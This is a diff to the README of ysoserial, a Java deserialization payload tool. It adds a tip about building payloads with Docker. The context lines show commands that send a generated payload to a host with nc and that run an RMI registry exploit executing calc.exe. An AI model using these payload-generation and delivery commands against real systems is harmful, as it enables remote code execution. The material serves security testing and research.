@@ -97,6 +97,12 @@ $ nc 10.10.10.10 1099 < groovypayload.bin
 $ java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit myhost 1099 CommonsCollections1 calc.exe
 ```
 
+If you use the Dockerfile provided to build your payloads make sure you run docker with `--tty=false`:
+
+```shell
+$ docker run -i --tty=false ysoserial CommonsCollections6 uname > payload.bin
+```
+
 ## Installation
 
 [![GitHub release](https://img.shields.io/github/downloads/frohoff/ysoserial/latest/total)](https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar)
